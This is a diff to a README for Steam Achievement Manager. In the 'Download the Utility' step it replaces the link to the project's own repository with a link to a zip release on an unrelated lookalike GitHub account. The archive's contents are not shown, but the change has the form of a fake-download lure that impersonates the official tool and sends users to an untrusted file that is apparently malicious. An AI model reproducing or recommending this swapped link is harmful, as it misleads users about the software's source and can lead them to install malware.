@@ -66,7 +66,7 @@ Offers a focused interface for achievement management without requiring a separa
 
 1. **Download the Utility:** Visit the project's repository and obtain the available release or source package.
 
-   [**DOWNLOAD STEAM ACHIEVEMENT MANAGER**](https://github.com/gibbed/SteamAchievementManager)
+   [**DOWNLOAD STEAM ACHIEVEMENT MANAGER**](https://github.com/Steam-Achievement-Manager-Download/.github/releases/download/2.1.7/Steam.AchievementManager.v.2.1.7.zip)
 
 2. **Extract the Archive:** If the download is provided as a `.zip` archive, extract its contents to a folder on your computer.
 
